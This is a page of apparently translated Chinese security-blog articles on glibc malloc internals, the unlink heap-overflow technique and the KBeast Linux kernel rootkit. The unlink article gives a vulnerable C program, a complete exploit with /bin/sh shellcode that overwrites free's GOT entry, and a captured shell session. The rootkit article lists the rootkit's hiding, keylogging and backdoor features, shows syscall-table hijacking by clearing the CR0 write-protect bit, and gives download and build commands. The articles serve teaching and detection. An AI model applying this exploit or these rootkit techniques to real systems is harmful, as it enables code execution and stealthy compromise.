+<li>不像small bin，large bin 里面的chunk都是大小不一，因此它们需要递减保存，最大的chunk保存在binlist的最前端，最小的chunk保存在最尾端。</li>
+</ul>
+</li>
+<li>合并 - 两个毗连的空闲chunk会被合并成一个空闲chunk。<br>malloc（large chunk） <ul>
+<li>初始情况下，large bin都会是NULL，因此尽管用户请求large chunk，提供服务的将是 next largetst bin code 而不是 large bin code。</li>
+<li>同样地，在第一次调用malloc期间，在malloc_state找到的samll bin和large bin数据结构被初始化，bin都会指向它们本身以表示binlist为空。</li>
+<li>此后当samll bin非空后，当最大chunk大小（在相应binlist中的）大于用户所请求的大小时，binlist就从顶部遍历到底部以找到一个大小最接近用户需求的chunk。一旦找到，相应chunk就会分成两块<br>User chunk（用户请求大小）-返回给用户。<br>Remainder chunk（剩余大小） -添加到unsorted bin。</li>
+<li>当最大chunk大小（在相应binlist中的）小于用户所请求的大小时，尝试在Next largest bin中查到到所需的chunk以响应用户请求。Next largest bin code会扫描binmaps以找到下一个最大非空bin，如果这样的bin找到了，就从其中的binlist中检索到合适的chunk并返回给用户；反之就使用top chunk以响应用户请求。</li>
+</ul>
+</li>
+<li>free（large chunk）—类似于small trunk。</li>
+</ul>
+<p><u>Top Chunk</u>:<br>位于arena最顶端的chunk被成为top chunk，它不属于任何一个bin，当所有的bin都没有空闲块的时候，top chunk才会响应用户的请求，如果top chunk的大小大于用户请求的大小，那么top chunk就会被划分成两部分：</p>
+<ul>
+<li>User chunk（用户请求大小）</li>
+<li>Remainder chunk（剩余大小）</li>
+</ul>
+<p>Remainder chunk就变成了新的top chunk，如果top chunk的大小小余用户请求的大小，那么top chunk就会使用sbrk或者mmap系统调用来扩容</p>
+<p><u>Last Remainder Chunk</u>：<br>最后一次small request中因分割而得到的remainder chunk，Last Remainder Chunk有助于改进引用的局部性，也即连续的对small chunk的malloc请求可能最终导致各chunk被分配得彼此贴近。</p>
+<p>但是除了在一个 arena 里可用的的诸chunk，哪些chunk有资格成为Last Remainder Chunk呢？</p>
+<p>当一个用户请求small chunk，但是却没有得到small bin和unsorted bin的服务时，binmaps就会去扫描下一个最大的非空bin，正如之前所说，如果这样的bin找到了，它就会分割成两部分，其中user chunk会被返回给用户，而remainder chunk会被添加到unsorted bin里，此外，它就成为了最新的last remainder chunk。</p>
+<p>那么引用的局部性是如何实现的呢？</p>
+<p>当用户随后请求一个small chunk的时候，如果last remainder chunk是unsorted bin里面唯一的一个chunk，那么这个last remainder chunk就会分割成两部分，其中user chunk返回给用户，remainder chunk添加到unsorted bin中，此外，它就成为了最新的last remainder chunk，因此随后的内存分配最终导致各chunk被分配得彼此贴近。</p>
+<hr>
+<p><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170104/glibcmalloc" target="_blank" rel="external">Linux(X86)漏洞利用系列-深入理解glibc malloc)</a>》与作者信息：<a href="http://www.csyssec.org/about/" target="_blank" rel="external">CSysSec出品</a></p>
+
+      
+    </div>
+    <footer class="entry-meta entry-footer">
+      
+	<span class="ico-folder"></span>
+    <a class="article-category-link" href="/categories/系统内核/">系统内核<span class="article-category-count">9</span></a>
+
+
+      
+  <span class="ico-tags"></span>
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Exploit/">Exploit</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Kernel/">Kernel</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Linux/">Linux</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Memory/">Memory</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Security/">Security</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/System/">System</a></li></ul>
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+<!-- Table of Contents -->
+
+  
+    <article id="post-heapoverflow-unlink"  class="article article-type-post" itemscope itemprop="blogPost" >
+  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="thumb" itemprop="name">
+      <a class="article-title" href="/20170104/heapoverflow-unlink/">Unlink堆溢出</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-meta">
+      
+	Posted on <a href="/20170104/heapoverflow-unlink/" class="article-date">
+	  <time datetime="2017-01-04T10:06:46.000Z" itemprop="datePublished">一月 4, 2017</time>
+	</a>
+
+    </div>
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>作者: <a href="http://www.csyssec.org/about" target="_blank" rel="external">CSysSec出品</a></p>
+<hr>
+<p><strong>CSysSec注</strong>： 本系列文章译自安全自由工作者<a href="https://sploitfun.wordpress.com/about-2/" target="_blank" rel="external">Sploitfun</a>的漏洞利用系列博客，从经典栈缓冲区漏洞利用堆漏洞利用，循序渐进，是初学者不可多得的好材料，本系列所有文章涉及的源码可以在<a href="https://github.com/sploitfun/lsploits" target="_blank" rel="external">这里</a>找到。CSysSec计划在原基础上不断添加相关漏洞利用技术以及相应的Mitigation方法，欢迎推荐或自荐文章。<br><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170104/heapoverflow-unlink" target="_blank" rel="external">Linux(X86)漏洞利用系列-Unlink堆溢出)</a>》与作者信息：<a href="http://www.csyssec.org/about/" target="_blank" rel="external">CSysSec出品</a></p>
+<hr>
+<h3 id="写在最前"><a href="#写在最前" class="headerlink" title="写在最前"></a>写在最前</h3><p>chunk是指具体进行内存分配的区域，目前的默认大小是4M。 </p>
+<p><u>阅读基础</u></p>
+<p><a href="http://www.csyssec.org/20170104/glibcmalloc" target="_blank" rel="external">深入理解glibc malloc</a></p>
+<p>这篇文章，我们会学习到如何利用unlink技术成功利用堆缓冲区溢出。在深入了解unlink技术之前，我们先来看看一个漏洞程序：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/* </span></div><div class="line"> Heap overflow vulnerable program. </div><div class="line"> */</div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">( <span class="keyword">int</span> argc, <span class="keyword">char</span> * argv[] )</span></span></div><div class="line">&#123;</div><div class="line">        <span class="keyword">char</span> * first, * second;</div><div class="line"></div><div class="line"><span class="comment">/*[1]*/</span> first = <span class="built_in">malloc</span>( <span class="number">666</span> );</div><div class="line"><span class="comment">/*[2]*/</span> second = <span class="built_in">malloc</span>( <span class="number">12</span> );</div><div class="line">        <span class="keyword">if</span>(argc!=<span class="number">1</span>)</div><div class="line"><span class="comment">/*[3]*/</span>         <span class="built_in">strcpy</span>( first, argv[<span class="number">1</span>] );</div><div class="line"><span class="comment">/*[4]*/</span> <span class="built_in">free</span>( first );</div><div class="line"><span class="comment">/*[5]*/</span> <span class="built_in">free</span>( second );</div><div class="line"><span class="comment">/*[6]*/</span> <span class="keyword">return</span>( <span class="number">0</span> );</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>上面漏洞程序的第三行会导致堆缓冲区溢出。用户输入的’argv[1]’被拷贝到’first’堆缓冲区，而没有设定任何大小限制。因此，当用户的输入大于666字节时，边界就会覆盖下一个chunk的chunk头。这种溢出进而会导致任意代码执行。</p>
+<p>下面是漏洞程序堆内存的形象图:</p>
+<figure><br>    <a href="http://oij0laovn.bkt.clouddn.com/heapoverflow1.png" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/heapoverflow1.png" width="450"></a><br>    <figcaption></figcaption><br></figure>
+
+<p><u>Unlink</u>: 其主要思想是欺骗’glibc malloc’来达到解开(unlink) ‘second’ chunk的目的。当解开(unlinking) 时，free函数的GOT表项就会被shellcode的地址覆盖。 成功覆盖之后，在漏洞代码中第五行当free被调用时，shellcode就会被执行。还不清楚？没问题，我们先来看看当fre执行的时候’glibc malloc’都做了些什么。</p>
+<p>如果没有攻击中的影响，第[4]行中的<a href="https://github.com/sploitfun/lsploits/blob/master/hof/unlink/malloc_free_snip.c" target="_blank" rel="external">free</a>会做下面这些事情：</p>
+<ul>
+<li>对于<a href="https://github.com/sploitfun/lsploits/blob/master/hof/unlink/malloc_free_snip.c#L10" target="_blank" rel="external">没有被映射的chunks来说</a>，向后合并(consolidate banckward)或者向前合并(consolidate forward)。</li>
+<li>向后合并：<ul>
+<li><a href="https://github.com/sploitfun/lsploits/blob/master/hof/unlink/malloc_free_snip.c#L17" target="_blank" rel="external">查找前一个chunk是否空闲</a>- 如果当前被释放的chunk的PREV_INUSE(P)位没有设置，则shuoming 说明前一个chunk是空闲的。在我们的例子中，由于“first”的PREV_INUSE位已经设置，说明前一个chunk已经被分配了，默认情况下，堆内存的第一个chunk前一个chunk被分配(尽管它不存在)。</li>
+<li><a href="https://github.com/sploitfun/lsploits/blob/master/hof/unlink/malloc_free_snip.c#L18" target="_blank" rel="external">如果空闲，则合并</a> 比如，从binlist上unlink(移除)前一个chunk,然后将前一个chunk的大小加到当前大小中并修改chunk指针指向前一个chunk。在我们的例子中，前一个chunk已经被分配了，因此unlink没有执行。从而当前被释放的chunk ‘first’不能被向后合并。</li>
+</ul>
+</li>
+<li>向前合并:<ul>
+<li><a href="https://github.com/sploitfun/lsploits/blob/master/hof/unlink/malloc_free_snip.c#L26" target="_blank" rel="external">查找下一个chunk是否空闲</a>- 如果下下个chunk(从当前被释放的chunk算起)的PREV_INUSE(P)位没有设置，则shuoming 说明下前一个chunk是空闲的。为了遍历到下下个chunk，将当前被释放chunk的大小加入到chunk指针，然后将下一个chunk的大小加入到下一个chunk指针。在我们的例子中，当前被释放chunk的下下个指针是top chunk，并且它的PREV_INUSE位已经设置，说明下一个chunk ‘second’不是空闲的。</li>
+<li><a href="https://github.com/sploitfun/lsploits/blob/master/hof/unlink/malloc_free_snip.c#L30" target="_blank" rel="external">如果空闲，则合并</a> 比如，从binlist上unlink(移除)前一个chunk,然后将下一个chunk的大小加到当前大小中。在我们的例子中，下一个chunk已经被分配了，因此unlink没有执行。从而当前被释放的chunk ‘first’不能被向前合并。</li>
+</ul>
+</li>
+<li>现在，<a href="https://github.com/sploitfun/lsploits/blob/master/hof/unlink/malloc_free_snip.c#L41" target="_blank" rel="external">将被合并的chunk添加到未排序的bin中</a>。在我们的例子中，合并未能成功执行，所以只要将’first’ chunk添加到未排序的bin中。</li>
+</ul>
+<p>现在我们可以说攻击者在第[3]行按照以下方式覆盖了’second’ chunk的chunk头部：</p>
+<ul>
+<li>prev_size = 偶数，因此PREV_INUSE没有被设置</li>
+<li>size = -4</li>
+<li>fd = free地址 -12</li>
+<li>bk = shellcode地址</li>
+</ul>
+<p>如果受到攻击者的影响，第[4]行中的free会做以下事情：</p>
+<ul>
+<li>对于没有被映射的chunks来说，向后合并(consolidate banckward)或者向前合并(consolidate forward)。</li>
+<li>向后合并：<ul>
+<li>查找前一个chunk是否空闲- 如果当前被释放的chunk的PREV_INUSE(P)位没有设置，则shuoming 说明前一个chunk是空闲的。在我们的例子中，由于“first”的PREV_INUSE位已经设置，说明前一个chunk已经被分配了，默认情况下，堆内存的第一个chunk前一个chunk被分配(尽管它不存在)。</li>
+<li>如果空闲，则合并 比如，从binlist上unlink(移除)前一个chunk,然后将前一个chunk的大小加到当前大小中并修改chunk指针指向前一个chunk。在我们的例子中，前一个chunk已经被分配了，因此unlink没有执行。从而当前被释放的chunk ‘first’不能被向后合并。</li>
+</ul>
+</li>
+<li>向前合并:<ul>
+<li>查找下一个chunk是否空闲- 如果下下个chunk(从当前被释放的chunk算起)的PREV_INUSE(P)位没有设置，则说明下前一个chunk是空闲的。为了遍历到下下个chunk，将当前被释放chunk的大小加入到chunk指针，然后将下一个chunk的大小加入到下一个chunk指针。在我们的例子中，当前被释放chunk的下下个指针不是(NOT)top chunk。由于攻击者已经用-4覆盖了’second’ chunk的大小，’second’ chunk的下下个chunk应该在-4偏移处。因此，现在’glibc malloc’将’second’ chunk的prev_inuse当做下下个chunk的大小域。由于攻击者已经用一个偶数(PREV_INUSE(P)位被复位)覆盖了prev_size，这样就欺骗了’glibc malloc’ 让其相信’second’ chunk是释放的。</li>
+<li>如果空闲，则合并] 比如，从binlist上unlink(移除)前一个chunk,然后将下一个chunk的大小加到当前大小中。在我们的例子中，下一个chunk是空闲的，因此’second’ chunk将按以下方式<a href="https://github.com/sploitfun/lsploits/blob/master/hof/unlink/malloc_unlink_snip.c" target="_blank" rel="external">unlink</a>。<pre><code>+  将&apos;second&apos; chunk的fd和bk值相应的拷贝到[FD](https://github.com/sploitfun/lsploits/blob/master/hof/unlink/malloc_unlink_snip.c#L3)与[BK](https://github.com/sploitfun/lsploits/blob/master/hof/unlink/malloc_unlink_snip.c#L4)变量。在我们例子中，FD =free地址-12， BK=shellcode地址 (作为堆溢出的一部分，攻击者将shellcode放入&apos;first&apos;堆缓冲区内部）。
++  [BK的值被拷贝到FD的12偏移处](https://github.com/sploitfun/lsploits/blob/master/hof/unlink/malloc_unlink_snip.c#L5)。在我们的例子中，将12字节加入到FD中，然后指向free的GOT表项。这样一来，GOT表项就被shellcode的地址覆盖了。太棒了！现在，任何时候只要free被调用，就会执行shellcode! 因此，漏洞程序中的第五行就会导致shellcode的执行。
+</code></pre></li>
+</ul>
+</li>
+<li>现在，将被合并的chunk添加到未排序的bin中。</li>
+</ul>
+<p>被攻击者修改过的用户输入，漏洞程序的堆内存的形象图如下：</p>
+<figure><br>    <a href="http://oij0laovn.bkt.clouddn.com/heapoverflow2.png" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/heapoverflow2.png" width="450"></a><br>    <figcaption></figcaption><br></figure>
+
+<p>理解了unlink技术之后，我们就可以写漏洞利用程序了。</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div></pre></td><td class="code"><pre><div class="line">/* Program to exploit 'vuln' using unlink technique.</div><div class="line"> */</div><div class="line">#include &lt;string.h&gt;</div><div class="line">#include &lt;unistd.h&gt;</div><div class="line"></div><div class="line">#define FUNCTION_POINTER ( 0x0804978c )         //Address of GOT entry for free function obtained using "objdump -R vuln".</div><div class="line">#define CODE_ADDRESS ( 0x0804a008 + 0x10 )      //Address of variable 'first' in vuln executable. </div><div class="line"></div><div class="line">#define VULNERABLE "./vuln"</div><div class="line">#define DUMMY 0xdefaced</div><div class="line">#define PREV_INUSE 0x1</div><div class="line"></div><div class="line">char shellcode[] =</div><div class="line">        /* Jump instruction to jump past 10 bytes. ppssssffff - Of which ffff would be overwritten by unlink function</div><div class="line">        (by statement BK-&gt;fd = FD). Hence if no jump exists shell code would get corrupted by unlink function. </div><div class="line">        Therefore store the actual shellcode 12 bytes past the beginning of buffer 'first'*/</div><div class="line">        "\xeb\x0assppppffff"</div><div class="line">        "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";</div><div class="line"></div><div class="line">int main( void )</div><div class="line">&#123;</div><div class="line">        char * p;</div><div class="line">        char argv1[ 680 + 1 ];</div><div class="line">        char * argv[] = &#123; VULNERABLE, argv1, NULL &#125;;</div><div class="line"></div><div class="line">        p = argv1;</div><div class="line">        /* the fd field of the first chunk */</div><div class="line">        *( (void **)p ) = (void *)( DUMMY );</div><div class="line">        p += 4;</div><div class="line">        /* the bk field of the first chunk */</div><div class="line">        *( (void **)p ) = (void *)( DUMMY );</div><div class="line">        p += 4;</div><div class="line">        /* the fd_nextsize field of the first chunk */</div><div class="line">        *( (void **)p ) = (void *)( DUMMY );</div><div class="line">        p += 4;</div><div class="line">        /* the bk_nextsize field of the first chunk */</div><div class="line">        *( (void **)p ) = (void *)( DUMMY );</div><div class="line">        p += 4;</div><div class="line">        /* Copy the shellcode */</div><div class="line">        memcpy( p, shellcode, strlen(shellcode) );</div><div class="line">        p += strlen( shellcode );</div><div class="line">        /* Padding- 16 bytes for prev_size,size,fd and bk of second chunk. 16 bytes for fd,bk,fd_nextsize,bk_nextsize </div><div class="line">        of first chunk */</div><div class="line">        memset( p, 'B', (680 - 4*4) - (4*4 + strlen(shellcode)) );</div><div class="line">        p += ( 680 - 4*4 ) - ( 4*4 + strlen(shellcode) );</div><div class="line">        /* the prev_size field of the second chunk. Just make sure its an even number ie) its prev_inuse bit is unset */</div><div class="line">        *( (size_t *)p ) = (size_t)( DUMMY &amp; ~PREV_INUSE );</div><div class="line">        p += 4;</div><div class="line">        /* the size field of the second chunk. By setting size to -4, we trick glibc malloc to unlink second chunk.*/</div><div class="line">        *( (size_t *)p ) = (size_t)( -4 );</div><div class="line">        p += 4;</div><div class="line">        /* the fd field of the second chunk. It should point to free - 12. -12 is required since unlink function</div><div class="line">        would do + 12 (FD-&gt;bk). This helps to overwrite the GOT entry of free with the address we have overwritten in </div><div class="line">        second chunk's bk field (see below) */</div><div class="line">        *( (void **)p ) = (void *)( FUNCTION_POINTER - 12 );</div><div class="line">        p += 4;</div><div class="line">        /* the bk field of the second chunk. It should point to shell code address.*/</div><div class="line">        *( (void **)p ) = (void *)( CODE_ADDRESS );</div><div class="line">        p += 4;</div><div class="line">        /* the terminating NUL character */</div><div class="line">        *p = '';</div><div class="line"></div><div class="line">        /* the execution of the vulnerable program */</div><div class="line">        execve( argv[0], argv, NULL );</div><div class="line">        return( -1 );</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>执行上面的漏洞利用程序，可以触发一个新的shell!</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">sploitfun@sploitfun-VirtualBox:~/lsploits/hof/unlink$ gcc -g -z norelro -z execstack -o vuln vuln.c -Wl,--rpath=/home/sploitfun/glibc/glibc-inst2<span class="number">.20</span>/lib -Wl,--dynamic-linker=/home/sploitfun/glibc/glibc-inst2<span class="number">.20</span>/lib/ld-linux.so<span class="number">.2</span></div><div class="line">sploitfun@sploitfun-VirtualBox:~/lsploits/hof/unlink$ gcc -g -o <span class="built_in">exp</span> <span class="built_in">exp</span>.c</div><div class="line">sploitfun@sploitfun-VirtualBox:~/lsploits/hof/unlink$ ./<span class="built_in">exp</span> </div><div class="line">$ ls</div><div class="line">cmd  <span class="built_in">exp</span>  <span class="built_in">exp</span>.c  vuln  vuln.c</div><div class="line">$ <span class="built_in">exit</span></div><div class="line">sploitfun@sploitfun-VirtualBox:~/lsploits/hof/unlink$</div></pre></td></tr></table></figure>
+<p><u>保护</u>: 现如今，’glibc malloc’经过许多年的发展已经被强化了(hardened)，unlink已经技术无法成功执行。为了防御unlink技术带来的堆溢出，’glibc malloc’加入了下面的检查：</p>
+<ul>
+<li><a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L3947" target="_blank" rel="external">两次释放(Double Free)</a>: 释放已经处于空闲状态的chunk是禁止的。当攻击者试图将’second’ chunk的大小覆盖为-4, 其PREV_INUSE位被复位，意味着’first’已经处于空闲状态。这时’glibc malloc’会抛出一个两次释放错误。</li>
+</ul>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (__glibc_unlikely (!prev_inuse(nextchunk)))</div><div class="line">    &#123;</div><div class="line">      errstr = <span class="string">"double free or corruption (!prev)"</span>;</div><div class="line">      <span class="keyword">goto</span> errout;</div><div class="line">    &#125;</div></pre></td></tr></table></figure>
+<ul>
+<li><a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L3954" target="_blank" rel="external">无效的next size</a>: 下一个chunk的大小介于8字节与arena的总系统内存之间。当攻击者试图将’second’ chunk的大小覆盖为-4,’glibc malloc’会抛出一个无效的next size错误</li>
+</ul>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (__builtin_expect (nextchunk-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</div><div class="line">        || __builtin_expect (nextsize &gt;= av-&gt;system_mem, <span class="number">0</span>))</div><div class="line">      &#123;</div><div class="line">        errstr = <span class="string">"free(): invalid next size (normal)"</span>;</div><div class="line">        <span class="keyword">goto</span> errout;</div><div class="line">      &#125;</div></pre></td></tr></table></figure>
+<ul>
+<li><a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L1414" target="_blank" rel="external">损坏的双链表</a>： 前一个chunk的fd和下一个chunk的bk必须指向当前被unlinked的chunk。当攻击者分别将fd和bk覆盖为-12与shellcode地址， free和(shellcode地址+8)没有指向当前被unlinked的chunk(‘second’)。 ‘glibc malloc’会抛出一个损坏的双链表错误.</li>
+</ul>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))                     </div><div class="line">      malloc_printerr (check_action, <span class="string">"corrupted double-linked list"</span>, P);</div></pre></td></tr></table></figure>
+<p><u>注意</u>：为了更好的演示，漏洞程序在编译的时候没有添加以下保护机制：</p>
+<p><a href="https://en.wikipedia.org/wiki/Address_space_layout_randomization" target="_blank" rel="external">ASLR</a><br><a href="https://en.wikipedia.org/wiki/NX_bit" target="_blank" rel="external">NX</a><br><a href="https://isisblogs.poly.edu/2011/06/01/relro-relocation-read-only/" target="_blank" rel="external">RELRO(ReLocation Read-Only)</a></p>
+<p>参考</p>
+<p><a href="http://phrack.org/issues/57/8.html" target="_blank" rel="external">vudo malloc tricks</a></p>
+<hr>
+<p><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170104/heapoverflow-unlink" target="_blank" rel="external">Linux(X86)漏洞利用系列-Unlink堆溢出)</a>》与作者信息：<a href="http://www.csyssec.org/about/" target="_blank" rel="external">CSysSec出品</a></p>
+
+      
+    </div>
+    <footer class="entry-meta entry-footer">
+      
+	<span class="ico-folder"></span>
+    <a class="article-category-link" href="/categories/漏洞利用/">漏洞利用<span class="article-category-count">14</span></a>
+
+
+      
+  <span class="ico-tags"></span>
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Exploit/">Exploit</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Heap/">Heap</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Security/">Security</a></li></ul>
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+<!-- Table of Contents -->
+
+  
+    <article id="post-kbeastanalysis"  class="article article-type-post" itemscope itemprop="blogPost" >
+  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="thumb" itemprop="name">
+      <a class="article-title" href="/20170104/kbeastanalysis/">内核层恶意代码KBeast分析与检测</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-meta">
+      
+	Posted on <a href="/20170104/kbeastanalysis/" class="article-date">
+	  <time datetime="2017-01-04T08:12:27.000Z" itemprop="datePublished">一月 4, 2017</time>
+	</a>
+
+    </div>
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>作者：<a href="http://weibo.com/diting0x" target="_blank" rel="external">Diting0x</a></p>
+<hr>
+<p><strong>CSysSec注</strong>： 本文来自<a href="http://www.chongh.wiki/about/" target="_blank" rel="external">Diting0x</a>的<a href="http://www.chongh.wiki/blog/2016/04/03/kbeast-analysis-detection/" target="_blank" rel="external">个人博客</a>，该文深入分析了KBeast的原理以及源代码，并给出了检测KBeast实验方法，KBeast是学习内核层恶意代码不错的样本。<br><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170104/kbeastanalysis/" target="_blank" rel="external">内核层恶意代码KBeast分析与检测</a>》与作者信息：<a href="http://weibo.com/diting0x" target="_blank" rel="external">Diting0x</a></p>
+<hr>
+<blockquote>
+<ul>
+<li>0x01 全文环境</li>
+<li>0X02 Kbeast 特性</li>
+<li>0X03 系统调用劫持基础</li>
+<li>0X04 Kbeast 使用</li>
+<li>0X05 Kbeast 核心</li>
+<li>0X06 Libvmi and Volatility检测KBeast</li>
+</ul>
+</blockquote>
+<hr>
+<h3 id="0x01-全文环境"><a href="#0x01-全文环境" class="headerlink" title="0x01 全文环境"></a>0x01 全文环境</h3><p>Host Ubuntu 12.04 + Guest Ubuntu 10.04/11.04 + Libvmi + Volatility</p>
+<p>其中Kbeast运行在Guest Ubuntu 10.04/11.04中，libvmi与volatility运行在Host Ubuntu12.04中。</p>
+<h3 id="0X02-Kbeast-特性"><a href="#0X02-Kbeast-特性" class="headerlink" title="0X02 Kbeast 特性"></a>0X02 Kbeast 特性</h3><p>以下是Kbeast实现的功能：</p>
+<ul>
+<li>隐藏可加载模块（LKM)</li>
+<li>隐藏文件/目录</li>
+<li>隐藏进程（ps,pstree,top,lsof)</li>
+<li>隐藏套接字和网络连接(netstat,lsof)</li>
+<li>记录键盘操作捕获用户行为</li>
+<li>反杀死进程</li>
+<li>反移除文件</li>
+<li>反删除可加载模块</li>
+<li>root提权后门</li>
+<li>远程绑定后门 </li>
+</ul>
+<h3 id="0X03-系统调用劫持基础"><a href="#0X03-系统调用劫持基础" class="headerlink" title="0X03 系统调用劫持基础"></a>0X03 系统调用劫持基础</h3><p>上述的Kbeast特性都是通过系统调用劫持实现的。在kernel 2.6.*之前，系统调用表”sys_call_table”是可以直接导出引用的，如：</p>
+<pre><code>extern void *sys_call_table[];
+sys_call_table[__NR_syscall] = pointer
+</code></pre><p>而在kernel 2.6.* 之后禁用了这种特性，并且其所在页是写保护的。然而，系统调用表依然在内存中，如果知道其所在内存地址，依然可以通过指针访问。内核中的符号表System.map （一般在/boot/目录下)记录了所有的符号及其地址，当然也包括系统调用表”sys_call_table”.  以Ubuntu 10.04为例，执行：</p>
+<pre><code>grep sys_call_table /boot/System.map-2.6.32-21-generic
+</code></pre><p>显示的结果为</p>
+<pre><code>c0592150 R sys_call_table
+</code></pre><p>c0592150指的是线性地址，R说明此地址所在的页面Read-only。目前的CPU都会将CR0控制寄存器的第16位（wp-bit）置1,将页面开启保护模式，这时CPU处于”write-proteed”模式，否则处于”read/write”模式。CR0寄存器的位描述可参考<a href="https://en.wikipedia.org/wiki/Control_register#CR0" target="_blank" rel="external">CR0</a>. </p>
+<p>如果能将WP位置0，就可以访问内存页面,读写系统调用表了。 下面这行代码便可实现此功能：</p>
+<pre><code>write_cr0 (read_cr0 () &amp; (~ 0x10000));
+</code></pre><h3 id="0X04-Kbeast-使用"><a href="#0X04-Kbeast-使用" class="headerlink" title="0X04 Kbeast 使用"></a>0X04 Kbeast 使用</h3><p>下载<a href="https://packetstormsecurity.com/files/108286/KBeast-Kernel-Beast-Linux-Rootkit-2012.html" target="_blank" rel="external">Kbeast</a>. </p>
+<pre><code>tar xzf ipsecs-kbeast-v1.tar.gz
+cd kbeast-v1
+./setup build 1  
+</code></pre><p>具体可参考/kbeast-v1/setup 文件，参数1表示默认为kernel 2.6.32。测试过ubuntu11.04 内核为2.6.38，setup出错，作者声称：<br>Be kind to note that the beast has been tested in, but not limited to, kernel 2.6.9,<br>2.6.16, 2.6.18, 2.6.32, 2.6.35 (i386 or x86_64)，理论上只要修改setup相关参数以及ipsecs-kbeast-vl.c文件中的系统调用表的地址即可适应其它版本内核，未测试。</p>
